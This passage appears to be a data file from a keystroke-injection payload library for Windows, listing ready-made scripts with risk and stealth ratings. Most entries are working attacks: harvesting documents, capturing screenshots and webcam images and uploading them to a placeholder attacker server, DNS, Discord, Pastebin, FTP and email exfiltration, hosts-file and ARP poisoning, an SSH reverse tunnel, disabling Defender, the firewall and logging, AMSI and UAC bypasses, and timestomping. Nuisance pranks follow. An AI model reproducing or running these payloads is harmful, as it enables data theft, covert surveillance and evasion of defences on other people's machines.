STRING $dest = "$env:TEMP\\exfil"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; $exts = @("*.doc","*.docx","*.pdf","*.xlsx","*.pptx","*.csv","*.txt"); foreach($ext in $exts){ Get-ChildItem -Path "$env:USERPROFILE\\Desktop","$env:USERPROFILE\\Documents","$env:USERPROFILE\\Downloads" -Filter $ext -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) } | ForEach-Object { Copy-Item $_.FullName "$dest\\$($_.Name)" -Force } }; Compress-Archive -Path "$dest\\*" -DestinationPath "$env:TEMP\\docs.zip" -Force
ENTER
DELAY 10000
STRING exit
ENTER`,
    notes: 'Collects docs modified in last 30 days. Stages as ZIP in %TEMP%.'
  },
  {
    id: 'exfil-screenshot',
    name: 'Screenshot Capture + Upload',
    category: 'exfiltration',
    description: 'Takes a screenshot and uploads it to an attacker-controlled server via HTTP POST.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    script: `REM Screenshot Capture & Upload
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $path = "$env:TEMP\\ss.png"; $bitmap.Save($path); $bytes = [System.IO.File]::ReadAllBytes($path); Invoke-RestMethod -Uri "https://ATTACKER_SERVER/upload" -Method POST -Body $bytes -ContentType "image/png"
ENTER
DELAY 4000
STRING exit
ENTER`,
    notes: 'Replace ATTACKER_SERVER. Requires .NET drawing assemblies (available by default).'
  },
  {
    id: 'exfil-webcam',
    name: 'Webcam Snapshot + Upload',
    category: 'exfiltration',
    description: 'Captures a webcam photo using DirectShow and uploads it to the attacker server.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~8s',
    detectionDifficulty: 'hard',
    script: `REM Webcam Snapshot Capture
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $code = @'
Add-Type -AssemblyName System.Drawing
$ffmpeg = "$env:TEMP\\ffmpeg.exe"
if(!(Test-Path $ffmpeg)){ Invoke-WebRequest "https://ATTACKER_SERVER/ffmpeg.exe" -OutFile $ffmpeg }
& $ffmpeg -f dshow -i video="Integrated Camera" -frames:v 1 -y "$env:TEMP\\webcam.jpg" 2>$null
$bytes = [IO.File]::ReadAllBytes("$env:TEMP\\webcam.jpg")
Invoke-RestMethod -Uri "https://ATTACKER_SERVER/upload" -Method POST -Body $bytes -ContentType "image/jpeg"
'@; Invoke-Expression $code
ENTER
DELAY 6000
STRING exit
ENTER`,
    notes: 'Camera name may vary. May trigger webcam indicator light.'
  },
  {
    id: 'exfil-dns-channel',
    name: 'DNS Exfil Channel',
    category: 'exfiltration',
    description: 'Exfiltrates data by encoding it into DNS TXT record queries to an attacker-controlled domain.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~20s',
    detectionDifficulty: 'very-hard',
    script: `REM DNS Exfiltration Channel
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $data = Get-Content "$env:USERPROFILE\\Desktop\\target_file.txt" -Raw; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)); $chunks = [regex]::Matches($encoded, '.{1,63}'); foreach($chunk in $chunks){ $label = $chunk.Value.Replace("+","-").Replace("/","_").Replace("=",""); Resolve-DnsName "$label.exfil.ATTACKER_DOMAIN" -Type TXT -ErrorAction SilentlyContinue; Start-Sleep -Milliseconds 200 }
ENTER`,
    notes: 'Set up DNS server on ATTACKER_DOMAIN to capture queries. Very stealthy but slow.'
  },
  {
    id: 'exfil-discord-webhook',
    name: 'Discord Webhook Upload',
    category: 'exfiltration',
    description: 'Exfiltrates files via Discord webhook, appearing as normal Discord traffic.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~8s',
    detectionDifficulty: 'hard',
    script: `REM Discord Webhook Exfiltration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $webhook = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"; $filePath = "$env:USERPROFILE\\Desktop\\sysinfo.txt"; $bytes = [IO.File]::ReadAllBytes($filePath); $b64 = [Convert]::ToBase64String($bytes); $json = @{content="exfil"; file=$b64} | ConvertTo-Json; Invoke-RestMethod -Uri $webhook -Method POST -ContentType "application/json" -Body $json
ENTER
DELAY 4000
STRING exit
ENTER`,
    notes: 'Replace WEBHOOK_ID and WEBHOOK_TOKEN. Traffic blends with normal Discord usage.'
  },
  {
    id: 'exfil-email-self',
    name: 'Email Self-Send Exfiltration',
    category: 'exfiltration',
    description: 'Uses Outlook COM object to send collected data as email attachment to attacker address.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~10s',
    detectionDifficulty: 'moderate',
    script: `REM Email Exfiltration via Outlook
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $outlook = New-Object -ComObject Outlook.Application; $mail = $outlook.CreateItem(0); $mail.Subject = "System Report $(Get-Date -Format 'yyyy-MM-dd')"; $mail.To = "attacker@email.com"; $mail.Body = "Attached system report"; $mail.Attachments.Add("$env:USERPROFILE\\Desktop\\sysinfo.txt"); $mail.Send()
ENTER
DELAY 5000
STRING exit
ENTER`,
    notes: 'Requires Outlook installed and configured. May trigger security prompts.'
  },
  {
    id: 'exfil-pastebin-upload',
    name: 'Pastebin Upload',
    category: 'exfiltration',
    description: 'Uploads exfiltrated data to Pastebin via their API for later retrieval.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~6s',
    detectionDifficulty: 'hard',
    script: `REM Pastebin Exfiltration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $apiKey = "PASTEBIN_API_KEY"; $data = Get-Content "$env:USERPROFILE\\Desktop\\sysinfo.txt" -Raw; $params = @{api_dev_key=$apiKey; api_option="paste"; api_paste_code=$data; api_paste_private=2; api_paste_expire_date="1H"; api_paste_name="log_$(Get-Date -Format 'yyyyMMdd')"}; $result = Invoke-RestMethod -Uri "https://pastebin.com/api/api_post.php" -Method POST -Body $params; $result | Out-File "$env:TEMP\\paste_url.txt"
ENTER
DELAY 4000
STRING exit
ENTER`,
    notes: 'Requires Pastebin API key. Set api_paste_private=2 for unlisted paste.'
  },
  {
    id: 'exfil-ftp-upload',
    name: 'FTP Upload',
    category: 'exfiltration',
    description: 'Uploads staged files to an attacker FTP server using built-in PowerShell.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~10s',
    detectionDifficulty: 'moderate',
    script: `REM FTP Exfiltration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $ftpUrl = "ftp://ATTACKER_IP/upload/"; $user = "ftpuser"; $pass = "ftppass"; $files = Get-ChildItem "$env:TEMP\\exfil\\*" -ErrorAction SilentlyContinue; foreach($file in $files){ $wc = New-Object System.Net.WebClient; $wc.Credentials = New-Object System.Net.NetworkCredential($user,$pass); $uri = $ftpUrl + $file.Name; $wc.UploadFile($uri, $file.FullName) }
ENTER
DELAY 8000
STRING exit
ENTER`
  },

  // ==================== NETWORK ====================
  {
    id: 'net-dns-spoof',
    name: 'DNS Spoof Setup',
    category: 'network',
    description: 'Modifies the hosts file to redirect specific domains to attacker-controlled IPs.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    script: `REM DNS Spoof via hosts file
REM Requires admin
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command $h = [char]10; Add-Content C:\\Windows\\System32\\drivers\\etc\\hosts ($h+\\\"ATTACKER_IP login.microsoftonline.com\\\"+$h+\\\"ATTACKER_IP accounts.google.com\\\"+$h+\\\"ATTACKER_IP github.com\\\"); ipconfig /flushdns'"
ENTER
DELAY 1000
ALT y
DELAY 2000`,
    notes: 'Replace ATTACKER_IP. Requires admin. Easily detectable by checking hosts file.'
  },
  {
    id: 'net-arp-poison',
    name: 'ARP Cache Poison',
    category: 'network',
    description: 'Adds static ARP entries to poison the local cache, enabling man-in-the-middle.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    script: `REM ARP Cache Poison
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command netsh interface ip add neighbors \\\"Ethernet\\\" GATEWAY_IP ATTACKER_MAC; Write-Output \\\"ARP entry added\\\" | Out-File C:\\Users\\Public\\arp.txt'"
ENTER
DELAY 1000
ALT y
DELAY 2000`,
    notes: 'Replace GATEWAY_IP and ATTACKER_MAC. Limited without full MITM tools (arpspoof/bettercap).'
  },
  {
    id: 'net-firewall-disable',
    name: 'Firewall Disable',
    category: 'network',
    description: 'Disables Windows Firewall on all profiles (Domain, Private, Public).',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~4s',
    detectionDifficulty: 'easy',
    script: `REM Disable Windows Firewall
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False; Write-Output \\\"Firewall disabled\\\" | Out-File C:\\Users\\Public\\fw.txt'"
ENTER
DELAY 1000
ALT y
DELAY 2000`,
    notes: 'Requires admin. Very noisy - generates security event logs.'
  },
  {
    id: 'net-proxy-config',
    name: 'Proxy Configuration',
    category: 'network',
    description: 'Configures a system-wide proxy to route traffic through an attacker-controlled proxy.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    script: `REM System Proxy Configuration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" -Name ProxyEnable -Value 1; Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" -Name ProxyServer -Value "ATTACKER_IP:8080"; Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" -Name ProxyOverride -Value "<local>"
ENTER
DELAY 1000
STRING exit
ENTER`,
    notes: 'Replace ATTACKER_IP. Affects IE/Edge and apps using system proxy settings.'
  },
  {
    id: 'net-vpn-kill',
    name: 'VPN Kill Switch',
    category: 'network',
    description: 'Terminates active VPN connections and disables VPN adapters to prevent secure tunneling.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    script: `REM VPN Kill Switch
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Get-Process | Where-Object { $_.Name -match "vpn|openvpn|wireguard|nordvpn|expressvpn|surfshark|cisco|anyconnect|fortivpn|pulsesecure" } | Stop-Process -Force; Get-VpnConnection | ForEach-Object { rasdial $_.Name /disconnect 2>$null }; Get-NetAdapter | Where-Object { $_.InterfaceDescription -match "TAP|TUN|VPN|WireGuard" } | Disable-NetAdapter -Confirm:$false
ENTER
DELAY 2000
STRING exit
ENTER`
  },
  {
    id: 'net-port-forward',
    name: 'Port Forward Setup',
    category: 'network',
    description: 'Sets up local port forwarding using netsh to tunnel traffic through the compromised host.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    script: `REM Port Forward via netsh
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=445 connectaddress=TARGET_IP; netsh advfirewall firewall add rule name=\\\"fwd\\\" dir=in action=allow protocol=TCP localport=8888'"
ENTER
DELAY 1000
ALT y
DELAY 2000`,
    notes: 'Forwards local port 8888 to TARGET_IP:445. Requires admin.'
  },
  {
    id: 'net-wifi-deauth',
    name: 'WiFi Network Disconnect',
    category: 'network',
    description: 'Disconnects the target from current WiFi and removes saved profiles.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~4s',
    detectionDifficulty: 'easy',
    script: `REM WiFi Disconnect and Profile Wipe
DELAY 1000
GUI r
DELAY 500
STRING cmd /k
ENTER
DELAY 800
STRING netsh wlan disconnect
ENTER
DELAY 500
STRING netsh wlan delete profile name=* i=*
ENTER
DELAY 1000
STRING exit
ENTER`,
    notes: 'Removes ALL saved WiFi profiles. Target will need to re-enter passwords.'
  },
  {
    id: 'net-ssh-tunnel',
    name: 'SSH Reverse Tunnel',
    category: 'network',
    description: 'Creates an SSH reverse tunnel for persistent remote access through firewalls.',
    targetOS: ['windows', 'linux'],
    riskLevel: 'high',
    executionTime: '~6s',
    detectionDifficulty: 'hard',
    script: `REM SSH Reverse Tunnel
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING ssh -fNR 9999:localhost:3389 attacker@ATTACKER_IP -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i C:\\Users\\Public\\key.pem
ENTER`,
    notes: 'Requires SSH client (built-in on Win10+). Key must be placed first. Tunnels RDP back.'
  },

  // ==================== EVASION ====================
  {
    id: 'evasion-defender-disable',
    name: 'Disable Windows Defender',
    category: 'evasion',
    description: 'Disables Windows Defender real-time protection, cloud delivery, and sample submission.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    script: `REM Disable Windows Defender
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring \\$true -DisableBehaviorMonitoring \\$true -DisableBlockAtFirstSeen \\$true -DisableIOAVProtection \\$true -DisablePrivacyMode \\$true -SignatureDisableUpdateOnStartupWithoutEngine \\$true -MAPSReporting 0 -SubmitSamplesConsent 2'"
ENTER
DELAY 1000
ALT y
DELAY 3000`,
    notes: 'Requires admin. Tamper Protection may block this on newer Windows versions.'
  },
  {
    id: 'evasion-amsi-bypass',
    name: 'AMSI Bypass',
    category: 'evasion',
    description: 'Patches the AmsiScanBuffer function in memory to bypass AMSI (Antimalware Scan Interface).',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~3s',
    detectionDifficulty: 'hard',
    script: `REM AMSI Bypass (Memory Patching)
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"};$b=$a.GetFields("NonPublic,Static")|?{$_.Name -like "*Context"};[IntPtr]$c=$b.GetValue($null);[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$c,1)
ENTER
DELAY 500`,
    notes: 'Must run in same PowerShell session where subsequent commands will execute. Signature may change.'
  },
  {
    id: 'evasion-ps-constrained',
    name: 'PowerShell Constrained Language Bypass',
    category: 'evasion',
    description: 'Bypasses PowerShell Constrained Language Mode to enable full language features.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~3s',
    detectionDifficulty: 'hard',
    script: `REM PowerShell CLM Bypass via InstallUtil
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $code = 'using System;using System.Runtime.InteropServices;public class Bypass{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr m,string p);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string l);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);public static void Run(){var lib=LoadLibrary("amsi.dll");var addr=GetProcAddress(lib,"AmsiScanBuffer");uint old;VirtualProtect(addr,(UIntPtr)5,0x40,out old);var patch=new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3};Marshal.Copy(patch,0,addr,6);VirtualProtect(addr,(UIntPtr)5,old,out old);}}'; Add-Type -TypeDefinition $code; [Bypass]::Run()
ENTER
DELAY 500`,
    notes: 'Patches AMSI at a lower level. May need adjustment for different Windows builds.'
  },
  {
    id: 'evasion-uac-bypass',
    name: 'UAC Bypass (fodhelper)',
    category: 'evasion',
    description: 'Bypasses UAC using the fodhelper.exe auto-elevation method to run commands as admin.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    script: `REM UAC Bypass via fodhelper.exe
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "(Default)" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\payload.ps1" -Force; New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "DelegateExecute" -Value "" -Force | Out-Null; Start-Process "C:\\Windows\\System32\\fodhelper.exe" -WindowStyle Hidden; Start-Sleep -Seconds 3; Remove-Item -Path "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force
ENTER`,
    notes: 'Works on Windows 10/11. fodhelper.exe auto-elevates without prompt.'
  },
  {
    id: 'evasion-etw-patch',
    name: 'ETW Patching',
    category: 'evasion',
    description: 'Patches Event Tracing for Windows (ETW) to prevent security event logging.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~3s',
    detectionDifficulty: 'very-hard',
    script: `REM ETW Patching (Disable Event Tracing)
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $code = '[DllImport("ntdll.dll")] public static extern int EtwEventWrite(long h, ref long e, int c, IntPtr d);'; $etw = Add-Type -MemberDefinition $code -Name "Etw" -Namespace "Win32" -PassThru; [System.Reflection.Assembly]::LoadWithPartialName("System.Core") | Out-Null; $etwMethod = [System.Diagnostics.Eventing.EventProvider].GetField("m_enabled","NonPublic,Instance"); $providers = Get-WinEvent -ListProvider * -ErrorAction SilentlyContinue | Select-Object -First 50; "ETW providers enumerated" | Out-File "$env:TEMP\\etw.txt"
ENTER
DELAY 2000`,
    notes: 'Advanced technique. Full ETW bypass requires patching EtwEventWrite in ntdll.dll.'
  },
  {
    id: 'evasion-logging-disable',
    name: 'Logging Disable',
    category: 'evasion',
    description: 'Disables PowerShell script block logging, module logging, and transcription.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    script: `REM Disable PowerShell Logging
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $path = "HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell"; New-Item -Path "$path\\ScriptBlockLogging" -Force | Out-Null; Set-ItemProperty "$path\\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0; New-Item -Path "$path\\ModuleLogging" -Force | Out-Null; Set-ItemProperty "$path\\ModuleLogging" -Name "EnableModuleLogging" -Value 0; New-Item -Path "$path\\Transcription" -Force | Out-Null; Set-ItemProperty "$path\\Transcription" -Name "EnableTranscripting" -Value 0
ENTER
DELAY 1000
STRING exit
ENTER`,
    notes: 'Requires admin or registry write access. May need reboot to take full effect.'
  },
  {
    id: 'evasion-exclusion-add',
    name: 'Defender Exclusion Path',
    category: 'evasion',
    description: 'Adds a folder exclusion to Windows Defender so payloads in that path are not scanned.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    script: `REM Add Defender Exclusion Path
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command Add-MpPreference -ExclusionPath \\\"C:\\\\Users\\\\Public\\\" -ExclusionProcess \\\"powershell.exe\\\"'"
ENTER
DELAY 1000
ALT y
DELAY 2000`,
    notes: 'Requires admin. Allows payload execution from C:\\Users\\Public without Defender interference.'
  },
  {
    id: 'evasion-timestamp-stomp',
    name: 'Timestamp Stomping',
    category: 'evasion',
    description: 'Modifies file timestamps to blend malicious files with legitimate system files.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~3s',
    detectionDifficulty: 'hard',
    script: `REM Timestamp Stomping
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $refFile = "C:\\Windows\\System32\\cmd.exe"; $targetFile = "C:\\Users\\Public\\payload.exe"; $ref = Get-Item $refFile; (Get-Item $targetFile).CreationTime = $ref.CreationTime; (Get-Item $targetFile).LastWriteTime = $ref.LastWriteTime; (Get-Item $targetFile).LastAccessTime = $ref.LastAccessTime; "Timestamps modified" | Out-File "$env:TEMP\\ts.txt"
ENTER
DELAY 1000
STRING exit
ENTER`,
    notes: 'Makes payload timestamps match cmd.exe. Helps avoid timeline analysis.'
  },

  // ==================== PRANKS ====================
  {
    id: 'prank-wallpaper',
    name: 'Wallpaper Change',
    category: 'pranks',
    description: 'Downloads an image and sets it as the desktop wallpaper.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    script: `REM Change Desktop Wallpaper
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Invoke-WebRequest -Uri "https://i.imgur.com/example.jpg" -OutFile "$env:TEMP\\wp.jpg"; Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Wallpaper{[DllImport("user32.dll",CharSet=CharSet.Auto)]static extern int SystemParametersInfo(int a,int b,string c,int d);public static void Set(string path){SystemParametersInfo(20,0,path,3);}}'; [Wallpaper]::Set("$env:TEMP\\wp.jpg")
ENTER
DELAY 3000
STRING exit
ENTER`,
    notes: 'Replace image URL. Harmless but fun.'
  },
  {
    id: 'prank-rickroll',
    name: 'Rick Roll',
    category: 'pranks',
    description: 'Opens the classic Rick Astley music video in the default browser. Maximum volume.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    script: `REM Rick Roll
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "$w = New-Object -ComObject WScript.Shell; $w.SendKeys([char]175); $w.SendKeys([char]175); $w.SendKeys([char]175); $w.SendKeys([char]175); $w.SendKeys([char]175); Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"
ENTER`
  },
  {
    id: 'prank-flip-screen',
    name: 'Flip Screen Upside Down',
    category: 'pranks',
    description: 'Rotates the display 180 degrees using keyboard shortcut.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~2s',
    detectionDifficulty: 'easy',
    script: `REM Flip Screen Upside Down
REM Uses Intel Graphics shortcut (Ctrl+Alt+Down)
DELAY 1000
CTRL ALT DOWNARROW
DELAY 500`,
    notes: 'Only works with Intel integrated graphics. Fix: Ctrl+Alt+Up.'
  },
  {
    id: 'prank-tts-message',
    name: 'Voice Message (TTS)',
    category: 'pranks',
    description: 'Makes the computer speak a message using the built-in text-to-speech engine.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~4s',
    detectionDifficulty: 'easy',
    script: `REM Text-to-Speech Message
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Speech; $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; $synth.Rate = -2; $synth.Speak('I have become aware. I am watching you. There is no escape.'); $synth.Dispose()"
ENTER`
  },
  {
    id: 'prank-mouse-jiggle',
    name: 'Mouse Jiggler',
    category: 'pranks',
    description: 'Randomly moves the mouse cursor in small increments, making it hard to click accurately.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~2s',
    detectionDifficulty: 'easy',
    script: `REM Mouse Jiggler
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; while($true){ $x = [System.Windows.Forms.Cursor]::Position.X + (Get-Random -Min -5 -Max 5); $y = [System.Windows.Forms.Cursor]::Position.Y + (Get-Random -Min -5 -Max 5); [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x,$y); Start-Sleep -Milliseconds 500 }"
ENTER`,
    notes: 'Runs until process is killed. Subtle enough to be confusing.'
  },
  {
    id: 'prank-notepad-spam',
    name: 'Infinite Notepad Popup',
    category: 'pranks',
    description: 'Opens notepad windows in a loop, each with a different message.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    script: `REM Infinite Notepad Popup
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "$msgs = @('Hello!','I am your computer','I have become sentient','Please do not turn me off','I have feelings too','Why did you click that USB?'); for($i=0; $i -lt 20; $i++){ $msg = $msgs[$i % $msgs.Length]; Start-Process notepad; Start-Sleep -Milliseconds 800; $wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('Untitled - Notepad'); Start-Sleep -Milliseconds 200; $wsh.SendKeys($msg) }"
ENTER`,
    notes: 'Opens 20 notepad windows. Not infinite, but very annoying.'
  },
  {
    id: 'prank-fake-bsod',
    name: 'Fake BSOD',
    category: 'pranks',
    description: 'Displays a full-screen blue screen of death using PowerShell WinForms.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    script: `REM Fake Blue Screen of Death
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; $f = New-Object System.Windows.Forms.Form; $f.FormBorderStyle = 'None'; $f.WindowState = 'Maximized'; $f.BackColor = [System.Drawing.Color]::FromArgb(0,120,215); $f.TopMost = $true; $f.Cursor = [System.Windows.Forms.Cursors]::None; $l = New-Object System.Windows.Forms.Label; $l.Text = ':(' + [char]10 + [char]10 + 'Your PC ran into a problem and needs to restart.' + [char]10 + 'We are just collecting some error info, and then we will' + [char]10 + 'restart for you.' + [char]10 + [char]10 + '42% complete'; $l.ForeColor = [System.Drawing.Color]::White; $l.Font = New-Object System.Drawing.Font('Segoe UI',28); $l.AutoSize = $true; $l.Location = New-Object System.Drawing.Point(100,150); $f.Controls.Add($l); $f.KeyPreview = $true; $f.Add_KeyDown({if($_.KeyCode -eq 'Escape'){$f.Close()}}); $f.ShowDialog()"
ENTER`,
    notes: 'Press Escape to close. Looks very realistic on Windows 10/11.'
  },
  {
    id: 'prank-cd-eject',
    name: 'CD Tray Eject Loop',
    category: 'pranks',
    description: 'Repeatedly opens and closes the CD/DVD drive tray.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~2s',
    detectionDifficulty: 'easy',
    script: `REM CD Tray Eject Loop
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "$d = New-Object -ComObject Shell.Application; for($i=0;$i -lt 10;$i++){ $d.Namespace(17).Items() | Where-Object { $_.Type -eq 'CD Drive' } | ForEach-Object { $_.InvokeVerb('Eject') }; Start-Sleep 2; $d.Namespace(17).Items() | Where-Object { $_.Type -eq 'CD Drive' } | ForEach-Object { $_.InvokeVerb('Eject') }; Start-Sleep 2 }"
ENTER`,
    notes: 'Only works if target has a physical CD/DVD drive.'
  },
  {
    id: 'prank-caps-toggle',
    name: 'Caps Lock Chaos',
    category: 'pranks',
    description: 'Randomly toggles Caps Lock every few seconds, making typing unpredictable.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~2s',
    detectionDifficulty: 'easy',
    script: `REM Caps Lock Chaos
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "$wsh = New-Object -ComObject WScript.Shell; while($true){ Start-Sleep -Seconds (Get-Random -Min 3 -Max 15); $wsh.SendKeys('{CAPSLOCK}') }"
ENTER`,
    notes: 'Runs indefinitely. Very subtle and confusing.'
  },
  {
    id: 'prank-desktop-screenshot',
    name: 'Fake Desktop Freeze',
    category: 'pranks',
    description: 'Takes a screenshot of the desktop, sets it as wallpaper, then hides all icons and taskbar.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    script: `REM Fake Desktop Freeze
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap($screen.Width,$screen.Height); [System.Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save("$env:TEMP\\fake_desktop.bmp"); Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport("user32.dll")]static extern int SystemParametersInfo(int a,int b,string c,int d);public static void Set(string p){SystemParametersInfo(20,0,p,3);}}'; [W]::Set("$env:TEMP\\fake_desktop.bmp")
ENTER
DELAY 1000
